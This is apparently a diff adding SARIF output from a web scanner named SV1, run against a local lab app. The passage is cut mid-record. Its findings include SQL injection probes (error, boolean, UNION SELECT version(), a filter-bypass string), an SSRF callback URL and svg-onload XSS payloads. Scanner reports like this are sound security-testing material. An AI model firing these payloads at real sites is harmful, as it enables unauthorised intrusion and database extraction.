@@ -1,0 +1,1727 @@
+{
+  "$schema": "https://docs.oasis-open.org/sarif/sarif/v2.1.0/cs01/schemas/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "SV1",
+          "fullName": "SV1 web vulnerability scanner",
+          "version": "1.4.0",
+          "rules": [
+            {
+              "id": "SV1/SQLI/boolean",
+              "name": "SQLI - boolean",
+              "shortDescription": {
+                "text": "SQLI - boolean"
+              },
+              "fullDescription": {
+                "text": "SQL injection: attacker-controlled input changes a database query."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "sqli",
+                  "boolean"
+                ],
+                "precision": "medium",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "SV1/SQLI/error",
+              "name": "SQLI - error",
+              "shortDescription": {
+                "text": "SQLI - error"
+              },
+              "fullDescription": {
+                "text": "SQL injection: attacker-controlled input changes a database query."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "sqli",
+                  "error"
+                ],
+                "precision": "medium",
+                "security-severity": "9.5"
+              }
+            },
+            {
+              "id": "SV1/SQLI/second-order",
+              "name": "SQLI - second-order",
+              "shortDescription": {
+                "text": "SQLI - second-order"
+              },
+              "fullDescription": {
+                "text": "SQL injection: attacker-controlled input changes a database query."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "sqli",
+                  "second-order"
+                ],
+                "precision": "medium",
+                "security-severity": "9.5"
+              }
+            },
+            {
+              "id": "SV1/SQLI/union",
+              "name": "SQLI - union",
+              "shortDescription": {
+                "text": "SQLI - union"
+              },
+              "fullDescription": {
+                "text": "SQL injection: attacker-controlled input changes a database query."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "sqli",
+                  "union"
+                ],
+                "precision": "high",
+                "security-severity": "9.5"
+              }
+            },
+            {
+              "id": "SV1/SSRF/ssrf-oob",
+              "name": "SSRF - ssrf-oob",
+              "shortDescription": {
+                "text": "SSRF - ssrf-oob"
+              },
+              "fullDescription": {
+                "text": "Server-side request forgery: the target fetches an attacker-controlled URL."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "ssrf",
+                  "ssrf-oob"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "SV1/XSS/blind-oob",
+              "name": "XSS - blind-oob",
+              "shortDescription": {
+                "text": "XSS - blind-oob"
+              },
+              "fullDescription": {
+                "text": "Cross-site scripting: attacker-controlled input executes in a victim browser."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "blind-oob"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "SV1/XSS/dom",
+              "name": "XSS - dom",
+              "shortDescription": {
+                "text": "XSS - dom"
+              },
+              "fullDescription": {
+                "text": "Cross-site scripting: attacker-controlled input executes in a victim browser."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "dom"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "SV1/XSS/reflected-attr",
+              "name": "XSS - reflected/attr",
+              "shortDescription": {
+                "text": "XSS - reflected/attr"
+              },
+              "fullDescription": {
+                "text": "Cross-site scripting: attacker-controlled input executes in a victim browser."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "reflected/attr"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "SV1/XSS/reflected-script",
+              "name": "XSS - reflected/script",
+              "shortDescription": {
+                "text": "XSS - reflected/script"
+              },
+              "fullDescription": {
+                "text": "Cross-site scripting: attacker-controlled input executes in a victim browser."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "reflected/script"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "SV1/XSS/reflected-text",
+              "name": "XSS - reflected/text",
+              "shortDescription": {
+                "text": "XSS - reflected/text"
+              },
+              "fullDescription": {
+                "text": "Cross-site scripting: attacker-controlled input executes in a victim browser."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "reflected/text"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "SV1/XSS/reflection-encoded",
+              "name": "XSS - reflection-encoded",
+              "shortDescription": {
+                "text": "XSS - reflection-encoded"
+              },
+              "fullDescription": {
+                "text": "Cross-site scripting: attacker-controlled input executes in a victim browser."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "reflection-encoded"
+                ],
+                "precision": "medium",
+                "security-severity": "5.5"
+              }
+            },
+            {
+              "id": "SV1/XSS/stored",
+              "name": "XSS - stored",
+              "shortDescription": {
+                "text": "XSS - stored"
+              },
+              "fullDescription": {
+                "text": "Cross-site scripting: attacker-controlled input executes in a victim browser."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "stored"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            }
+          ]
+        }
+      },
+      "invocations": [
+        {
+          "executionSuccessful": true,
+          "startTimeUtc": "2026-10-28T14:49:05Z",
+          "endTimeUtc": "2026-10-28T14:53:28Z"
+        }
+      ],
+      "columnKind": "utf16CodeUnits",
+      "results": [
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at GET http://127.0.0.1:8099/api/fetch [id] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/fetch"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "1a59234a917fa2240d5b222b3d5ac1f4e7e7a726e354d05d94091c30a0fc44e9"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "id",
+            "payload": "'",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at GET http://127.0.0.1:8099/api/fetch [id] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/fetch"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "1a59234a917fa2240d5b222b3d5ac1f4e7e7a726e354d05d94091c30a0fc44e9"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "id",
+            "payload": "'",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at POST http://127.0.0.1:8099/api/form [comment] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/form"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "87fc5619de91748181a9a3942487c3baddf510b2c0f36e01dc1eee0e633ef3c3"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "POST",
+            "param": "comment",
+            "payload": "'",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at GET http://127.0.0.1:8099/api/path/{id} [id] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/path/{id}"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "b0f5fbabb262a156d9e4764f02f0059ea4032fd2a222727369f27dd6fdc4dd05"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "id",
+            "payload": "'",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at GET http://127.0.0.1:8099/api/spa [id] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/spa"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "c5bb5d82414a76d1b9e1c8030f3955d637434e2d7ad079327c8ace87519bd75c"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "id",
+            "payload": "'",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at POST http://127.0.0.1:8099/csrf [message] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/csrf"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "91101d190470160ea0d1ee3e218be8f1694a629ca4e6a7c4b6ab15408976d9bc"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "POST",
+            "param": "message",
+            "payload": "'",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at GET http://127.0.0.1:8099/dynamic [id] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/dynamic"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "99b8d59b029936e11c72cbc529a5f46265af14c81bf64b9d65ba5a7ac0d08127"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "id",
+            "payload": "'",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/second-order",
+          "ruleIndex": 2,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at GET http://127.0.0.1:8099/profile [name] - stored via POST http://127.0.0.1:8099/profile [name] then surfaced on http://127.0.0.1:8099/profile: <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/profile"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "fdf4e63364ec52b6684e742988120ba0e66dedbb68ec80c9186ce7bb19ea0f63"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "name",
+            "payload": "sv1'",
+            "technique": "second-order",
+            "evidence": "stored via POST http://127.0.0.1:8099/profile [name] then surfaced on http://127.0.0.1:8099/profile: <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "second-order injection: the value was stored and later used in a query (MySQL)",
+            "data": {
+              "baseline_error": "",
+              "baseline_checked": "1"
+            },
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at GET http://127.0.0.1:8099/search [q] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/search"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "580f4394c561a3a6b073c9991de58af8563f29f79949a0a9c879df2f96e39c25"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "q",
+            "payload": "'",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at GET http://127.0.0.1:8099/union [q] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/union"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "a016d5b952ab27ba86584eb4f4cdc31b9fb9f557e16d389b4af9a562dcb929a4"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "q",
+            "payload": "'",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/union",
+          "ruleIndex": 3,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (CONFIRMED) at GET http://127.0.0.1:8099/union [q] - 3 columns, column 1 echoes back; version() -> 8.0.36-lab"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/union"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "6fabe4046da848a89b0f6e5a4f417b20258299e2d383f8f2aa409bddd71e50f9"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "CONFIRMED",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "q",
+            "payload": "1' UNION SELECT version(),NULL,NULL-- -",
+            "technique": "union",
+            "evidence": "3 columns, column 1 echoes back; version() -> 8.0.36-lab",
+            "detail": "union based injection: MySQL fingerprint extracted from the response",
+            "data": {
+              "user": "sv1@localhost",
+              "db": "sv1lab",
+              "tables": "users,notes,accounts"
+            },
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at POST http://127.0.0.1:8099/upload [comment] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/upload"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "7736fef4d5f759d3b33e9fda3f0ad604606917c6c08427114ec3672e715aec4e"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "POST",
+            "param": "comment",
+            "payload": "'",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/error",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "SQLI CRITICAL (HIGH) at GET http://127.0.0.1:8099/waf [q] - <html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/waf"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "ea6f34def786bbb6c3a4520a3c1789068c0dd978d2e08006d3ad6429f8e2c381"
+          },
+          "properties": {
+            "severity": "CRITICAL",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "q",
+            "payload": "'/**/AND/**/1=CONVERT(int,@@version)--/**/-",
+            "technique": "error",
+            "evidence": "<html><body><h1>error</h1><br />You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&#039;' at line 1</body></html>",
+            "detail": "database error surfaced (MySQL) - error based injection | filter bypassed with 2 encoded payload(s)",
+            "data": {},
+            "artifact": "",
+            "security-severity": "9.5"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/boolean",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "SQLI HIGH (HIGH) at POST http://127.0.0.1:8099/api/item [id] - true branch 100.0% like baseline, false branch 0.0% like baseline, branches 100.0% apart"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/item"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "f685bdfd881f70ed6707fd51234ee86bd1658ccc703d07d38dc7afc0386c630a"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "POST",
+            "param": "id",
+            "payload": "' AND '1'='1  |  ' AND '1'='2",
+            "technique": "boolean",
+            "evidence": "true branch 100.0% like baseline, false branch 0.0% like baseline, branches 100.0% apart",
+            "detail": "boolean based injection: the page changes only on the logical result",
+            "data": {},
+            "artifact": "",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/boolean",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "SQLI HIGH (HIGH) at GET http://127.0.0.1:8099/item [id] - true branch 100.0% like baseline, false branch 0.0% like baseline, branches 100.0% apart"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/item"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "cf361b65c280d72a6a7877ec988978070f5db18c8ef74ff39cf078c759367a4b"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "HIGH",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "id",
+            "payload": "' AND '1'='1  |  ' AND '1'='2",
+            "technique": "boolean",
+            "evidence": "true branch 100.0% like baseline, false branch 0.0% like baseline, branches 100.0% apart",
+            "detail": "boolean based injection: the page changes only on the logical result",
+            "data": {},
+            "artifact": "",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/SSRF/ssrf-oob",
+          "ruleIndex": 4,
+          "level": "error",
+          "message": {
+            "text": "SSRF HIGH (CONFIRMED) at GET http://127.0.0.1:8099/fetch [url] - target fetched http://127.0.0.1:8777/t/6e51507da5214874 at 17:51:04 from 127.0.0.1 (Python-urllib/3.14); response status 200"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/fetch"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "25a4bb0b3741d904b89f1058457d19911bc2ebde5e9c718145038a2146c1c8c6"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "SSRF",
+            "method": "GET",
+            "param": "url",
+            "payload": "http://127.0.0.1:8777/t/6e51507da5214874",
+            "technique": "ssrf-oob",
+            "evidence": "target fetched http://127.0.0.1:8777/t/6e51507da5214874 at 17:51:04 from 127.0.0.1 (Python-urllib/3.14); response status 200",
+            "detail": "url-like parameter made a server side request to the callback host",
+            "data": {
+              "oob": "fetched",
+              "from": "127.0.0.1",
+              "agent": "Python-urllib/3.14",
+              "time": "17:51:04"
+            },
+            "artifact": "",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/api/fetch [name] - executed in chromium: alert:sv1cfeb086f"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/fetch"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "6ddfbd43535a7316ca17689b35a6502d0c4e78d78724eadc5ba4a2313f95c174"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "name",
+            "payload": "<svg/onload=alert('sv1cfeb086f')>sv1cfeb086f",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv1cfeb086f",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-11.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/api/fetch [name] - executed in chromium: alert:sv1c70df27e"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/fetch"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "6ddfbd43535a7316ca17689b35a6502d0c4e78d78724eadc5ba4a2313f95c174"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "name",
+            "payload": "<svg/onload=alert('sv1c70df27e')>sv1c70df27e",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv1c70df27e",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-16.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at POST http://127.0.0.1:8099/api/form [comment] - executed in chromium: alert:sv1a1acbe00"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/form"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "3eda78d66bf0c4f896910a3bb4f6fbdc271177105500330b01cef206933e4f05"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "POST",
+            "param": "comment",
+            "payload": "<svg/onload=alert('sv1a1acbe00')>sv1a1acbe00",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv1a1acbe00",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-10.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/api/path/{id} [id] - executed in chromium: alert:sv18519c82c"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/path/{id}"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "7683662cc4e2dd28908d922be5d2e002513652859623dd92aa624306191b94aa"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "id",
+            "payload": "<svg/onload=alert('sv18519c82c')>sv18519c82c",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv18519c82c",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-14.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/api/spa [name] - executed in chromium: alert:sv1e4e96d00"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
